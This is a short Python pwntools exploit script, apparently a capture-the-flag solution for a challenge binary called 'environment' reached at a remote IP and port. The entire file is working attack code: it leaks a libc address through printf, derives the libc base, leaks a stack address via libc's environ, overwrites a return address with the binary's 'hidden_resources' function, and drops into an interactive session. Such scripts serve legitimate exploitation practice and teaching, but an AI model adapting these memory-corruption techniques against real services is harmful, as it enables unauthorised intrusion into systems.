#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('environment')
libc = ELF('./libc.so.6')
env = {
    "LD_PRELOAD": os.path.abspath('./libc.so.6')
}
# p = process(["./ld-2.27_64.so", elf.path], env=env)
# gdb.attach(p, 'init-gef\nb *0x40149A')
p = remote("138.68.147.232", 31736)

def option(num):
    p.sendlineafter('> ', str(num))

for _ in range(5):
    option(2)
    option(2)
    p.sendlineafter('> ', 'n')

p.recvuntil('[0x')
leak = int(p.recvuntil(']', True), 16)
libc.address = leak - libc.symbols['printf']
log.info("Libc: 0x{:x}".format(libc.address))

# for libc, ld version 2.27
# __rtld_lock_lock_recursive = libc.address + 0x619f68
# __rtld_lock_lock_recursive_param_addr = libc.address + 0x619968

for _ in range(5):
    option(2)
    option(2)
    p.sendlineafter('> ', 'n')

option(libc.symbols['environ'])
p.recvuntil("\x1b[0m")
stack_leak = u64(p.recvline(False).ljust(8, '\x00'))

log.info("Stack Leak: 0x{:x}".format(stack_leak))

win = elf.symbols['hidden_resources']

# for local with LD_PRELOAD
# plant_ret_addr = stack_leak - 280
plant_ret_addr = stack_leak - 288

option(1)
option(plant_ret_addr)
option(win)


p.interactive()
